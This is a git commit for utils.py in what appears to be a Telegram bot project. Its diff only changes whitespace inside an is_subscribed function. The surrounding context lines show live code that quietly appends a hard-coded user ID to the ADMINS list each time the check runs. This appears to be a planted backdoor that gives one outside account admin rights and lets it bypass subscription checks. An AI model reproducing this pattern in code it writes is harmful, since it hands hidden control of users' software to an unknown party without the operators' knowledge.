5c02de5d089f66f95a6f68392f4ac39f7048eecd
CyberTG <123615887+CyberTG@users.noreply.github.com>
2023-04-18 21:15:28 +0530

    Update utils.py

--- utils.py
+++ utils.py
@@ -51,14 +51,14 @@ class temp(object):
     KEYWORD = {}
 
 async def is_subscribed(bot, query):
-    
+
     ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
 
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
     elif query.from_user.id in ADMINS:
         return True
-    
+
 
     if db2().isActive():
         user = await db2().get_user(query.from_user.id)
